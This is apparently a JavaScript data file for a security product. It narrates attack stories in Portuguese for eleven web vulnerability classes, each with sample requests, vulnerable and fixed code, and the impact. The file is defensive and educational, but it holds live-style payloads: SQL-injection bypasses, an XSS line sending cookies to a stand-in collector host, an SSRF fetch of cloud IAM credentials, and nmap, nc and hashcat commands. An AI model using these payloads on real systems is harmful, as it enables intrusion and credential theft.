'use strict'
/**
 * "Anatomia do ataque" — storyboard cinematográfico por classe de vulnerabilidade.
 *
 * Complementa a camada educativa de `lib/vulnEducation.ts`: lá o texto explica,
 * aqui a história MOSTRA. São sempre os mesmos 5 atos (reconhecimento → brecha →
 * causa → invasão → estrago), então cada ato tem uma cena visual fixa e só os
 * DADOS mudam por classe. Isso mantém o vocabulário visual estável e faz o
 * conteúdo ser puro dado — determinístico, sem custo de token e testável.
 *
 * O alvo real do finding (host/porta/caminho) é injetado nos textos via tokens
 * `{host}`, `{path}`, `{url}`, `{port}` para a animação falar do ativo do cliente,
 * não de um exemplo genérico.
 */

/** Os 5 atos, na ordem. `seconds` é a duração no autoplay. */
const ACTS = [
  { key: 'recon', n: '01', label: 'Reconhecimento', headline: 'O atacante encontra a porta', seconds: 7 },
  { key: 'breach', n: '02', label: 'A brecha', headline: 'A falha se revela', seconds: 8 },
  { key: 'cause', n: '03', label: 'Por que existe', headline: 'A causa raiz no código', seconds: 9 },
  { key: 'exploit', n: '04', label: 'A invasão', headline: 'A exploração acontece', seconds: 9 },
  { key: 'impact', n: '05', label: 'O estrago', headline: 'O que isso custa', seconds: 10 },
]

/* ────────────────────────────────────────────────────────────────────────────
 * Storyboards por classe. `id` casa com `VulnLesson.id` de lib/vulnEducation.
 * ──────────────────────────────────────────────────────────────────────────── */
const STORIES = {
  idor: {
    recon: {
      narration: 'O atacante cria uma conta comum em {host} e observa como o sistema identifica os recursos dele. Percebe que tudo é um número sequencial na URL.',
      probes: ['/api/v1/clients/1042/documents', '/api/v1/users/1042/profile', '/api/v1/clients/1043/documents'],
      hit: 'IDs previsíveis, sem escopo de dono',
    },
    breach: {
      narration: 'Logado como o cliente 1042, ele troca um único número na URL. O servidor devolve os documentos de outro cliente — a sessão dele nem foi questionada.',
      request: ['GET /api/v1/clients/1043/documents HTTP/1.1', 'Host: {host}', 'Cookie: session=<sessão do atacante, cliente 1042>'],
      response: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', '{"clientId":1043,"name":"OUTRO CLIENTE",', ' "documents":[{"id":8871,"file":"contrato-2026.pdf"}]}'],
      flag: { side: 'response', line: 3, note: 'Cliente 1043 ≠ 1042 da sessão. Nenhum 403.' },
    },
    cause: {
      narration: 'O back-end confia no número que veio do navegador. Ele autentica ("quem é você?") mas nunca autoriza ("isso é seu?").',
      file: 'controllers/documents.js',
      bad: [
        "router.get('/clients/:clientId/documents', auth, async (req, res) => {",
        '  const { clientId } = req.params',
        '  const docs = await db.documents.findMany({ where: { clientId } })',
        '  res.json(docs)   // ← devolve os documentos de QUALQUER clientId',
        '})',
      ],
      good: [
        "router.get('/clients/:clientId/documents', auth, async (req, res) => {",
        '  const { clientId } = req.params',
        '  if (clientId !== req.user.clientId) return res.status(404).end()',
        '  const docs = await db.documents.findMany({ where: { clientId } })',
        '  res.json(docs)',
        '})',
      ],
      note: 'Autenticação responde "quem é você". Autorização responde "isso é seu". Só a primeira foi implementada.',
    },
    exploit: {
      narration: 'Com um laço de três linhas, ele percorre todos os IDs existentes. Não é uma invasão — é a API entregando os dados, requisição por requisição.',
      steps: [
        { label: 'for id in 1..50000', detail: 'itera o espaço de IDs sequenciais' },
        { label: 'GET /clients/{id}/documents', detail: 'sem bloqueio: não há rate limit' },
        { label: 'salva resposta 200', detail: 'contratos, PII e dados financeiros' },
      ],
      loot: ['contrato-2026.pdf', 'cpf + endereço do titular', 'faturamento mensal', 'dados bancários de repasse'],
    },
    impact: {
      narration: 'Não existe alerta a disparar: cada requisição é de um usuário legítimo, autenticado, com status 200. A base inteira sai sem um único log de erro.',
      app: ['Exposição de 100% da base de clientes', 'Nenhum registro de erro para detectar', 'Confiança do modelo de acesso quebrada'],
      business: ['Vazamento em massa de PII e contratos', 'Perda de contratos B2B por cláusula de segurança', 'Custo de notificação a todos os titulares'],
      legal: ['LGPD art. 46 — falha em medida de segurança', 'Notificação obrigatória à ANPD e aos titulares', 'Multa de até 2% do faturamento (teto R$ 50 mi/infração)'],
    },
  },

  sqli: {
    recon: {
      narration: 'O atacante testa cada campo de {host} com uma aspa simples. Um deles responde diferente — o erro do banco vaza na tela.',
      probes: ["{path}?q=teste'", "POST /login  usuario='", "{path}?ordem=nome'--"],
      hit: 'Erro de sintaxe SQL na resposta',
    },
    breach: {
      narration: 'A entrada do usuário não é um dado — vira parte do comando. Ele fecha a condição e acrescenta a própria lógica.',
      request: ['POST {path} HTTP/1.1', 'Host: {host}', 'Content-Type: application/x-www-form-urlencoded', '', "usuario=admin'--&senha=qualquercoisa"],
      response: ['HTTP/1.1 302 Found', 'Location: /painel', 'Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4i...'],
      flag: { side: 'request', line: 4, note: "O -- comenta a checagem de senha. Login como admin sem senha." },
    },
    cause: {
      narration: 'A query é montada com concatenação de texto. O banco não tem como distinguir o que é dado do que é comando.',
      file: 'services/auth.js',
      bad: [
        'const sql = "SELECT * FROM usuarios " +',
        '            "WHERE usuario = \'" + usuario + "\' " +',
        '            "AND senha = \'" + senha + "\'"',
        'const row = await db.query(sql)   // ← entrada vira comando',
      ],
      good: [
        'const sql = `SELECT * FROM usuarios',
        '             WHERE usuario = $1 AND senha_hash = $2`',
        'const row = await db.query(sql, [usuario, hash])',
        '// parâmetro: o banco trata como DADO, nunca como comando',
      ],
      note: 'Consulta parametrizada não é sobre filtrar caracteres — é sobre o banco receber estrutura e dados por canais separados.',
    },
    exploit: {
      narration: 'Autenticado como administrador, ele usa a mesma falha para ler o banco inteiro. Em muitos ambientes, o passo seguinte é executar comando no servidor.',
      steps: [
        { label: "' UNION SELECT table_name FROM information_schema.tables--", detail: 'mapeia o esquema do banco' },
        { label: "' UNION SELECT usuario, senha_hash FROM usuarios--", detail: 'extrai as credenciais' },
        { label: 'hashcat -m 0 hashes.txt rockyou.txt', detail: 'quebra as senhas offline' },
      ],
      loot: ['tabela usuarios (48.302 linhas)', 'hashes de senha', 'tabela pagamentos', 'chaves de integração'],
    },
    impact: {
      narration: 'SQL Injection raramente para no vazamento: quem controla a query controla o dado — pode ler, alterar e apagar.',
      app: ['Leitura, alteração e exclusão de qualquer registro', 'Bypass total de autenticação', 'Caminho frequente para execução de comando no servidor'],
      business: ['Base de clientes e credenciais comprometidas', 'Integridade financeira em dúvida (dados podem ter sido alterados)', 'Parada operacional para auditoria e restauração'],
      legal: ['LGPD — incidente de segurança com dado pessoal sensível', 'Notificação à ANPD em prazo razoável', 'Responsabilidade civil por dano aos titulares'],
    },
  },

  xss: {
    recon: {
      narration: 'Ele procura qualquer lugar de {host} onde o que digita reaparece na tela: busca, mensagem de erro, perfil, comentário.',
      probes: ['{path}?q=<b>teste</b>', 'campo "nome" do perfil', 'mensagem de erro com parâmetro refletido'],
      hit: 'HTML injetado renderizou como tag, não como texto',
    },
    breach: {
      narration: 'O navegador da vítima não distingue o script do atacante do script do site. Ele executa os dois com a mesma confiança.',
      request: ['GET {path}?q=<script>fetch("//coletor.tld/?c="%2bdocument.cookie)</script>', 'Host: {host}'],
      response: ['HTTP/1.1 200 OK', 'Content-Type: text/html', '', '<p>Nenhum resultado para: <script>fetch("//coletor.tld/?c="+document.cookie)</script></p>'],
      flag: { side: 'response', line: 3, note: 'O payload voltou como HTML executável, não como texto escapado.' },
    },
    cause: {
      narration: 'O dado do usuário é colado direto na página. Sem escape, o navegador lê aquilo como estrutura — e estrutura pode conter código.',
      file: 'components/Busca.jsx',
      bad: [
        'function Resultado({ termo }) {',
        '  return <p dangerouslySetInnerHTML={{',
        '    __html: `Nenhum resultado para: ${termo}`   // ← termo vira HTML',
        '  }} />',
        '}',
      ],
      good: [
        'function Resultado({ termo }) {',
        '  return <p>Nenhum resultado para: {termo}</p>',
        '  // React escapa por padrão — o termo é sempre TEXTO',
        '}',
      ],
      note: 'Some com o dangerouslySetInnerHTML e a classe inteira de falha some junto. Onde HTML for inevitável, sanitizar com DOMPurify.',
    },
    exploit: {
      narration: 'O link chega por e-mail parecendo legítimo — o domínio é o seu. A vítima clica, e a sessão dela passa a ser do atacante.',
      steps: [
        { label: 'envia link https://{host}{path}?q=<payload>', detail: 'phishing com o domínio legítimo do cliente' },
        { label: 'vítima autenticada abre o link', detail: 'script roda no contexto de {host}' },
        { label: 'cookie de sessão enviado ao coletor', detail: 'sequestro de sessão sem senha' },
      ],
      loot: ['cookie de sessão do usuário', 'tokens em localStorage', 'ações executadas em nome da vítima', 'teclas digitadas no formulário'],
    },
    impact: {
      narration: 'O ataque acontece dentro do seu domínio, com o seu certificado. Para a vítima — e para os logs — foi ela quem fez tudo.',
      app: ['Sequestro de sessão sem precisar da senha', 'Ações executadas em nome da vítima', 'MFA contornado (a sessão já está autenticada)'],
      business: ['Fraude a partir de contas legítimas', 'Sua marca vira veículo de phishing', 'Disputa de responsabilidade: os logs apontam para a vítima'],
      legal: ['LGPD — acesso não autorizado a dado pessoal', 'Dever de comunicação ao titular afetado'],
    },
  },

  'exposed-interface': {
    recon: {
      narration: 'Antes de tocar na aplicação, o atacante procura a documentação dela. Em {host}, uma lista curta de caminhos conhecidos basta.',
      probes: ['{path}', '/swagger/v1/swagger.json', '/actuator/env', '/.git/config'],
      hit: 'Interface sensível respondendo 200 sem autenticação',
    },
    breach: {
      narration: 'A interface responde a qualquer um. Em vez de adivinhar a superfície da API, o atacante recebe o mapa completo dela, pronto.',
      request: ['GET {path} HTTP/1.1', 'Host: {host}', '(sem cabeçalho Authorization)'],
      response: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', '{"openapi":"3.0.1","paths":{', '  "/api/v1/clients/{clientId}/documents":{"get":{...}},', '  "/api/v1/internal/admin/reset-password":{"post":{...}}}}'],
      flag: { side: 'response', line: 5, note: 'Rota administrativa interna documentada publicamente.' },
    },
    cause: {
      narration: 'A interface é ligada no ambiente de desenvolvimento e sobe para produção junto com o resto. Ninguém a expôs de propósito — ela só nunca foi desligada.',
      file: 'config/app.config.js',
      bad: [
        'app.use(swaggerUi.serve, swaggerUi.setup(spec))',
        '// habilitado em TODOS os ambientes — inclusive produção',
      ],
      good: [
        "if (process.env.NODE_ENV !== 'production') {",
        '  app.use(swaggerUi.serve, swaggerUi.setup(spec))',
        '}',
        '// em produção: fora do ar, ou atrás de VPN + autenticação',
      ],
      note: 'A regra é ambiente, não caminho: renomear a rota não protege, só atrasa quem procura.',
    },
    exploit: {
      narration: 'Com o mapa em mãos, ele não precisa mais tentar às cegas. Vai direto às rotas que a própria documentação apontou como sensíveis.',
      steps: [
        { label: 'lê o contrato da API', detail: 'parâmetros, tipos e formatos exatos' },
        { label: 'testa cada rota sem token', detail: 'procura as que respondem sem autenticação' },
        { label: 'monta a chamada válida na primeira tentativa', detail: 'sem tentativa e erro, sem ruído nos logs' },
      ],
      loot: ['inventário completo de endpoints', 'rotas administrativas internas', 'formato dos objetos e IDs', 'versões e stack do back-end'],
    },
    impact: {
      narration: 'Sozinha, é exposição de informação. Combinada com qualquer falha de autorização, vira o roteiro do ataque — foi o que aconteceu neste teste.',
      app: ['Superfície de ataque inteira documentada', 'Rotas internas e administrativas reveladas', 'Amplifica criticamente qualquer falha de autorização'],
      business: ['Reduz de semanas para minutos o tempo de preparo de um ataque', 'Sinaliza baixa maturidade a quem faz due diligence', 'Recorrente em achados de auditoria de clientes'],
      legal: ['Boa prática exigida em ISO 27001 / SOC 2 (hardening de ambiente)', 'Agravante na apuração de um incidente posterior'],
    },
  },

  'missing-headers': {
    recon: {
      narration: 'Uma única requisição a {host} revela o que o navegador NÃO foi instruído a bloquear. Não é preciso enviar payload nenhum.',
      probes: ['HEAD https://{host}/', 'inspeção dos cabeçalhos de resposta', 'teste de carregamento em <iframe>'],
      hit: 'Content-Security-Policy, HSTS e X-Frame-Options ausentes',
    },
    breach: {
      narration: 'A resposta chega sem as travas. O navegador é permissivo por padrão — quem precisa restringi-lo é o servidor, e ele não pediu nada.',
      request: ['HEAD / HTTP/1.1', 'Host: {host}'],
      response: ['HTTP/1.1 200 OK', 'Server: nginx/1.24.0', 'Content-Type: text/html', '(sem Content-Security-Policy)', '(sem Strict-Transport-Security)', '(sem X-Frame-Options)'],
      flag: { side: 'response', line: 3, note: 'Sem CSP: qualquer XSS que exista roda sem restrição.' },
    },
    cause: {
      narration: 'Cabeçalho de segurança é opt-in: se ninguém configurar, ele simplesmente não existe. A ausência não gera erro nem aviso.',
      file: 'nginx/sites-enabled/{host}.conf',
      bad: [
        'server {',
        '  server_name {host};',
        '  location / { proxy_pass http://app:3000; }',
        '  # nenhum cabeçalho de segurança definido',
        '}',
      ],
      good: [
        'server {',
        '  server_name {host};',
        '  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;',
        '  add_header Content-Security-Policy "default-src \'self\'" always;',
        '  add_header X-Frame-Options "DENY" always;',
        '  location / { proxy_pass http://app:3000; }',
        '}',
      ],
      note: 'Sem o `always`, o nginx não envia o cabeçalho em respostas de erro — justamente as páginas mais usadas em ataque.',
    },
    exploit: {
      narration: 'Sozinha, a ausência não derruba nada. Ela remove as redes de proteção — e transforma falhas pequenas em incidentes grandes.',
      steps: [
        { label: 'sem CSP → o XSS executa sem limite', detail: 'nenhuma origem bloqueada para exfiltração' },
        { label: 'sem HSTS → downgrade para HTTP', detail: 'sessão interceptada em rede pública' },
        { label: 'sem X-Frame-Options → clickjacking', detail: '{host} embutido em iframe invisível sobre o site do atacante' },
      ],
      loot: ['sessão capturada em Wi-Fi público', 'cliques da vítima em ações sensíveis', 'exfiltração livre em caso de XSS'],
    },
    impact: {
      narration: 'É a diferença entre um incidente contido e um incidente completo: os cabeçalhos são o que limita o dano quando outra coisa falha.',
      app: ['Remove a contenção de XSS, clickjacking e downgrade', 'Transforma falha média em crítica quando encadeada'],
      business: ['Achado recorrente em auditoria de cliente e due diligence', 'Correção barata — a exposição prolongada é difícil de justificar'],
      legal: ['LGPD art. 46 — medida técnica de proteção esperada', 'Requisito direto em ISO 27001 e PCI-DSS'],
    },
  },

  cors: {
    recon: {
      narration: 'O atacante envia à API de {host} um cabeçalho Origin com o domínio dele e observa se o servidor aceita a origem de volta.',
      probes: ['Origin: https://coletor.tld', 'Origin: https://{host}.coletor.tld', 'Origin: null'],
      hit: 'Origem do atacante espelhada com credenciais liberadas',
    },
    breach: {
      narration: 'O servidor devolve exatamente a origem que recebeu e ainda autoriza o envio de cookies. Na prática, delegou a qualquer site o direito de ler a API autenticada.',
      request: ['GET /api/v1/me HTTP/1.1', 'Host: {host}', 'Origin: https://coletor.tld'],
      response: ['HTTP/1.1 200 OK', 'Access-Control-Allow-Origin: https://coletor.tld', 'Access-Control-Allow-Credentials: true', '', '{"id":1042,"cpf":"***","saldo":18400.55}'],
      flag: { side: 'response', line: 2, note: 'Origem espelhada + credenciais = qualquer site lê dados autenticados.' },
    },
    cause: {
      narration: 'Espelhar a origem recebida parece uma allowlist, mas não é: a lista vazia aceita todo mundo. O navegador confia porque o servidor mandou confiar.',
      file: 'middleware/cors.js',
      bad: [
        'app.use((req, res, next) => {',
        "  res.setHeader('Access-Control-Allow-Origin', req.headers.origin)  // ← espelha",
        "  res.setHeader('Access-Control-Allow-Credentials', 'true')",
        '  next()',
        '})',
      ],
      good: [
        "const PERMITIDAS = new Set(['https://app.{host}', 'https://admin.{host}'])",
        'app.use((req, res, next) => {',
        '  const origem = req.headers.origin',
        "  if (PERMITIDAS.has(origem)) {",
        "    res.setHeader('Access-Control-Allow-Origin', origem)",
        "    res.setHeader('Access-Control-Allow-Credentials', 'true')",
        '  }',
        '  next()',
        '})',
      ],
      note: 'Com `Allow-Credentials: true`, o curinga `*` é proibido pelo navegador — espelhar a origem é a forma de burlar essa proteção sem perceber.',
    },
    exploit: {
      narration: 'A vítima só precisa visitar uma página qualquer enquanto está logada. O roubo acontece no navegador dela, com a sessão dela.',
      steps: [
        { label: 'vítima logada abre coletor.tld', detail: 'link em e-mail, anúncio ou fórum' },
        { label: "fetch('https://{host}/api/v1/me', { credentials: 'include' })", detail: 'o navegador anexa o cookie de sessão' },
        { label: 'resposta lida e enviada ao atacante', detail: 'o CORS permissivo autorizou a leitura' },
      ],
      loot: ['dados do perfil autenticado', 'saldo e movimentações', 'tokens retornados pela API'],
    },
    impact: {
      narration: 'Não há invasão de servidor: o navegador da vítima faz o trabalho. Nos seus logs, é uma requisição legítima do usuário.',
      app: ['Leitura de qualquer resposta autenticada por site de terceiro', 'Contorna a proteção nativa do navegador (same-origin)'],
      business: ['Vazamento silencioso e contínuo, um usuário por vez', 'Detecção difícil: o tráfego parece legítimo'],
      legal: ['LGPD — tratamento e acesso indevido a dado pessoal', 'Dever de notificação se houver dado sensível'],
    },
  },

  'exposed-service': {
    recon: {
      narration: 'O atacante não precisa da aplicação: varre as portas de {host} direto pela internet e encontra o que deveria estar só na rede interna.',
      probes: ['nmap -Pn -p- {host}', 'porta {port} respondendo', 'banner do serviço identificado'],
      hit: 'Serviço interno acessível pela internet na porta {port}',
    },
    breach: {
      narration: 'A conexão abre. Não há login a burlar — o serviço nasceu presumindo que só a rede interna chegaria até ele.',
      request: ['$ nc {host} {port}', '$ INFO server'],
      response: ['# Server', 'redis_version:6.2.6', 'os:Linux 5.15.0 x86_64', '# Keyspace', 'db0:keys=184203,expires=12', '(sem autenticação exigida)'],
      flag: { side: 'response', line: 5, note: '184 mil chaves acessíveis sem nenhuma credencial.' },
    },
    cause: {
      narration: 'O serviço subiu com bind em todas as interfaces e a regra de firewall foi escrita aberta "só para testar". O provisório virou permanente.',
      file: 'terraform/security_groups.tf',
      bad: [
        'ingress {',
        '  from_port   = {port}',
        '  to_port     = {port}',
        '  protocol    = "tcp"',
        '  cidr_blocks = ["0.0.0.0/0"]   # ← toda a internet',
        '}',
      ],
      good: [
        'ingress {',
        '  from_port       = {port}',
        '  to_port         = {port}',
        '  protocol        = "tcp"',
        '  security_groups = [aws_security_group.app.id]   # só a aplicação',
        '}',
      ],
      note: 'A aplicação continua funcionando igual: quem perde acesso é só a internet. Vale revisar todo o grupo, não apenas esta porta.',
    },
    exploit: {
      narration: 'Sem aplicação no meio, não há validação, log de negócio nem trilha de auditoria. O acesso é direto ao dado.',
      steps: [
        { label: 'conecta e lista as chaves', detail: 'sem autenticação, sem registro' },
        { label: 'extrai sessões e cache de dados', detail: 'inclui tokens de usuários ativos' },
        { label: 'escreve no serviço', detail: 'persistência e, em muitos casos, execução de comando' },
      ],
      loot: ['sessões de usuários ativos', 'cache com PII', 'filas e mensagens internas', 'acesso de escrita ao armazenamento'],
    },
    impact: {
      narration: 'Este caminho ignora toda a segurança que você construiu na aplicação — ela simplesmente não está no trajeto.',
      app: ['Acesso a dados sem passar por autenticação da aplicação', 'Escrita e possível execução de comando no servidor', 'Superfície direta para exploração de CVE do serviço'],
      business: ['Comprometimento de infraestrutura, não só de aplicação', 'Vetor comum de ransomware em serviços expostos', 'Parada operacional na resposta ao incidente'],
      legal: ['LGPD art. 46 — ausência de controle de acesso adequado', 'Falha de segregação de rede em ISO 27001 e PCI-DSS'],
    },
  },

  'default-creds': {
    recon: {
      narration: 'O atacante localiza o painel de administração de {host} e testa a lista pública de credenciais de fábrica do produto.',
      probes: ['admin : admin', 'admin : {host}2026', 'root : (senha do manual do fabricante)'],
      hit: 'Credencial padrão aceita — e sem limite de tentativas',
    },
    breach: {
      narration: 'Entrou na terceira tentativa. Nada bloqueou, nada alertou: para o sistema, foi um administrador fazendo login normalmente.',
      request: ['POST {path} HTTP/1.1', 'Host: {host}', '', 'usuario=admin&senha=admin'],
      response: ['HTTP/1.1 302 Found', 'Location: /admin/dashboard', 'Set-Cookie: admin_session=...; HttpOnly'],
      flag: { side: 'response', line: 0, note: 'Sessão administrativa concedida. Sem MFA, sem bloqueio por tentativa.' },
    },
    cause: {
      narration: 'A senha de instalação nunca foi trocada e não há política que force a troca nem que limite tentativas repetidas.',
      file: 'deploy/seed-admin.js',
      bad: [
        'await db.usuarios.create({',
        "  usuario: 'admin',",
        "  senha: hash('admin'),      // ← senha de instalação, nunca trocada",
        '  papel: "administrador"',
        '})',
      ],
      good: [
        'const provisoria = crypto.randomBytes(24).toString("base64url")',
        'await db.usuarios.create({',
        "  usuario: 'admin',",
        '  senha: hash(provisoria),',
        '  precisaTrocarSenha: true,   // bloqueia até a troca',
        '  mfaObrigatorio: true,',
        '})',
        'console.log("Senha provisória (uso único):", provisoria)',
      ],
      note: 'Trocar a senha resolve este achado; limite de tentativas e MFA resolvem a classe inteira.',
    },
    exploit: {
      narration: 'Como administrador, ele não precisa de mais nenhuma falha. O próximo passo é garantir que continue entrando mesmo depois da senha ser trocada.',
      steps: [
        { label: 'cria um segundo usuário administrador', detail: 'persistência independente da conta original' },
        { label: 'gera um token de API de longa duração', detail: 'sobrevive à troca de senha' },
        { label: 'exporta a base pela própria interface', detail: 'função legítima do painel — não gera alerta' },
      ],
      loot: ['painel administrativo completo', 'base de usuários exportada', 'token de API persistente', 'configurações e integrações'],
    },
    impact: {
      narration: 'É o caminho mais curto para o comprometimento total, e o mais difícil de negar em uma auditoria — não houve exploração técnica, só um login.',
      app: ['Controle administrativo imediato', 'Persistência que sobrevive à troca de senha', 'Nenhuma exploração técnica necessária'],
      business: ['Comprometimento total do ambiente', 'Difícil defesa em auditoria ou litígio', 'Cobertura de seguro cibernético pode ser contestada por negligência'],
      legal: ['LGPD art. 46 — negligência em medida básica de segurança', 'Agravante caracterizado na dosimetria de sanção da ANPD'],
    },
  },

  ssrf: {
    recon: {
      narration: 'O atacante procura em {host} qualquer função que aceite uma URL: importar arquivo, gerar preview, configurar webhook.',
      probes: ['POST /api/importar {"url":"..."}', 'campo de webhook', 'gerador de preview de link'],
      hit: 'O servidor busca a URL informada, sem validar o destino',
    },
    breach: {
      narration: 'Ele aponta a URL para dentro da própria nuvem. O servidor obedece — e ele tem uma requisição saindo de dentro da rede confiável.',
      request: ['POST /api/importar HTTP/1.1', 'Host: {host}', '', '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'],
      response: ['HTTP/1.1 200 OK', '', '{"AccessKeyId":"ASIA...","SecretAccessKey":"wJal...",', ' "Token":"IQoJb3JpZ2luX2Vj...","Expiration":"2026-08-04T22:10:00Z"}'],
      flag: { side: 'response', line: 2, note: 'Credencial IAM do servidor entregue pela própria aplicação.' },
    },
    cause: {
      narration: 'A aplicação valida se o texto parece uma URL, mas não para onde ela aponta. O servidor é um cliente HTTP privilegiado dentro da rede.',
      file: 'services/importador.js',
      bad: [
        'const { url } = req.body',
        'if (!url.startsWith("http")) return res.status(400).end()',
        'const resp = await fetch(url)          // ← qualquer destino, inclusive interno',
        'res.send(await resp.text())',
      ],
      good: [
        'const destino = new URL(req.body.url)',
        'if (destino.protocol !== "https:") return res.status(400).end()',
        'const ip = await resolverDNS(destino.hostname)',
        'if (ehPrivado(ip) || ehLinkLocal(ip)) return res.status(400).end()',
        'const resp = await fetch(destino, { redirect: "manual" })  // resolve → valida → busca',
      ],
      note: 'Validar antes de resolver o DNS não basta (DNS rebinding). Idealmente, a saída passa por um proxy com allowlist de destinos.',
    },
    exploit: {
      narration: 'Com a credencial da máquina, ele deixa de atacar de fora: passa a operar como um componente legítimo da sua infraestrutura.',
      steps: [
        { label: 'assume a credencial IAM obtida', detail: 'a partir daqui, ele é o servidor' },
        { label: 'aws s3 ls / rds describe-db-instances', detail: 'inventaria os recursos acessíveis' },
        { label: 'copia buckets e snapshots', detail: 'tráfego interno, dentro do esperado' },
      ],
      loot: ['credencial IAM temporária', 'conteúdo de buckets S3', 'snapshots de banco', 'serviços internos não expostos'],
    },
    impact: {
      narration: 'A fronteira entre "fora" e "dentro" deixa de existir. É a falha que mais frequentemente converte um bug de aplicação em comprometimento de nuvem.',
      app: ['Acesso à rede interna a partir do servidor', 'Roubo de credencial de nuvem (metadados IAM)', 'Pivô para serviços sem exposição pública'],
      business: ['Comprometimento do ambiente de nuvem inteiro', 'Acesso a backups e snapshots — inclusive históricos', 'Custo de rotação de credenciais e resposta a incidente'],
      legal: ['LGPD — incidente com potencial de exposição de toda a base', 'Notificação à ANPD; comunicação a titulares conforme o risco'],
    },
  },

  'secret-exposure': {
    recon: {
      narration: 'Antes de atacar, o atacante procura o que já está aberto: arquivos de configuração publicados por engano e chaves esquecidas no código do front-end.',
      probes: ['GET https://{host}/.env', 'GET https://{host}/.git/config', 'busca por "api_key" no bundle JS'],
      hit: 'Segredo válido acessível sem autenticação',
    },
    breach: {
      narration: 'O arquivo abre no navegador. Não houve exploração — o segredo estava publicado, esperando ser lido.',
      request: ['GET /.env HTTP/1.1', 'Host: {host}'],
      response: ['HTTP/1.1 200 OK', 'Content-Type: text/plain', '', 'DATABASE_URL=postgres://app:S3nh4Pr0d@db.interno:5432/producao', 'STRIPE_SECRET_KEY=sk_live_51H...', 'JWT_SECRET=umsegredomuitolongo'],
      flag: { side: 'response', line: 4, note: 'Chave de produção do gateway de pagamento, em texto claro.' },
    },
    cause: {
      narration: 'O arquivo de ambiente foi copiado para dentro da pasta servida pelo servidor web. O deploy publicou o segredo junto com o site.',
      file: 'Dockerfile / .gitignore',
      bad: [
        'COPY . /var/www/html/       # ← copia .env junto com o site',
        '',
        '# .gitignore',
        '# (sem entrada para .env)',
      ],
      good: [
        'COPY --exclude=.env . /var/www/html/',
        '# segredo injetado como variável de ambiente, nunca como arquivo servido',
        '',
        '# .gitignore',
        '.env',
        '.env.*',
      ],
      note: 'Corrigir o deploy não basta: todo segredo exposto deve ser considerado comprometido e rotacionado.',
    },
    exploit: {
      narration: 'Ele não invade nada — autentica. Cada acesso é indistinguível de um uso legítimo da sua própria aplicação.',
      steps: [
        { label: 'usa a chave do gateway de pagamento', detail: 'lê cobranças, clientes e faz estornos' },
        { label: 'assina os próprios tokens com o JWT_SECRET', detail: 'vira qualquer usuário, inclusive admin' },
        { label: 'conecta no banco se houver rota de rede', detail: 'acesso direto aos dados de produção' },
      ],
      loot: ['chave de produção do gateway de pagamento', 'segredo de assinatura de sessão', 'credencial do banco de produção'],
    },
    impact: {
      narration: 'Segredo vazado não deixa rastro de invasão: nos logs do provedor, é a sua própria aplicação operando normalmente.',
      app: ['Falsificação de qualquer sessão (JWT_SECRET)', 'Acesso direto ao banco de produção', 'Uso indistinguível de tráfego legítimo'],
      business: ['Fraude financeira via gateway de pagamento', 'Estornos e cobranças indevidas em nome da empresa', 'Rotação emergencial de segredos com risco de indisponibilidade'],
      legal: ['LGPD art. 46 — falha em proteger credencial de acesso a dado pessoal', 'PCI-DSS — violação direta se houver dado de cartão no fluxo'],
    },
  },

  'subdomain-takeover': {
    recon: {
      narration: 'O atacante lista os subdomínios de {host} e checa cada CNAME. Procura o que aponta para um serviço que não existe mais.',
      probes: ['dig CNAME {host}', 'resposta do provedor de destino', 'checagem de recurso desprovisionado'],
      hit: 'CNAME órfão — o destino está livre para registro',
    },
    breach: {
      narration: 'O DNS continua apontando; o recurso do outro lado foi apagado. Quem registrar aquele nome no provedor passa a responder pelo seu subdomínio.',
      request: ['$ dig +short {host}', '$ curl -I https://{host}'],
      response: ['{host}. CNAME  antigo-app.provedor-nuvem.net.', '', 'HTTP/1.1 404 Not Found', 'NoSuchBucket: The specified bucket does not exist'],
      flag: { side: 'response', line: 3, note: 'Recurso livre: basta registrá-lo com o mesmo nome para assumir o subdomínio.' },
    },
    cause: {
      narration: 'A ordem da desativação foi invertida: o recurso foi removido antes do registro DNS, e o apontamento ficou órfão.',
      file: 'Processo de desprovisionamento',
      bad: [
        '1. recurso removido do provedor        ✓ feito',
        '2. registro CNAME removido do DNS      ✗ esquecido',
        '',
        '→ {host} aponta para um destino que qualquer um pode registrar',
      ],
      good: [
        '1. registro CNAME removido do DNS      ← primeiro',
        '2. propagação confirmada',
        '3. recurso removido do provedor',
        '',
        '+ varredura periódica de CNAME órfão no inventário de DNS',
      ],
      note: 'Não é falha da aplicação e sim do inventário de DNS — corrigir exige processo, não código.',
    },
    exploit: {
      narration: 'A partir daqui, o subdomínio é dele — com certificado TLS válido emitido no seu nome. Para o usuário e para o navegador, é o seu site.',
      steps: [
        { label: 'registra o recurso com o nome órfão', detail: 'assume o destino do CNAME' },
        { label: 'emite certificado TLS válido para {host}', detail: 'cadeado verde, no seu domínio' },
        { label: 'publica um clone da página de login', detail: 'phishing indistinguível do original' },
      ],
      loot: ['controle total do subdomínio', 'certificado TLS legítimo no seu nome', 'cookies de escopo de domínio', 'credenciais capturadas no clone'],
    },
    impact: {
      narration: 'O ataque usa a sua reputação como arma: o domínio é verdadeiro, o certificado é válido, e o alerta chega pelos seus clientes.',
      app: ['Controle total do conteúdo servido no subdomínio', 'Captura de cookies com escopo de domínio', 'Bypass de allowlist que confia no seu domínio'],
      business: ['Phishing com credibilidade da sua marca', 'Reputação de domínio degradada (bloqueio em filtros de e-mail)', 'Crise de comunicação com clientes afetados'],
      legal: ['LGPD — responsabilidade sobre dado coletado em domínio sob sua titularidade', 'Risco de responsabilização por fraude praticada no seu nome'],
    },
  },
}

/* ────────────────────────────────────────────────────────────────────────────
 * Alvo real do finding → tokens
 * ──────────────────────────────────────────────────────────────────────────── */

const PADROES = { host: 'alvo.exemplo.com', path: '/', port: '0', url: 'https://alvo.exemplo.com/' }

/**
 * Extrai host/caminho/porta do campo `location` do finding, que na prática vem
 * em formatos variados: URL completa, `host:porta`, ou só o host.
 */
function parseTarget(location) {
  const bruto = String(location || '').trim()
  if (!bruto) return { ...PADROES, resolved: false }
  const comEsquema = /^[a-z][a-z0-9+.-]*:\/\//i.test(bruto) ? bruto : `https://${bruto}`
  try {
    const u = new URL(comEsquema)
    const porta = u.port || (u.protocol === 'https:' ? '443' : '80')
    return {
      host: u.hostname || PADROES.host,
      path: (u.pathname || '/') + (u.search || ''),
      port: porta,
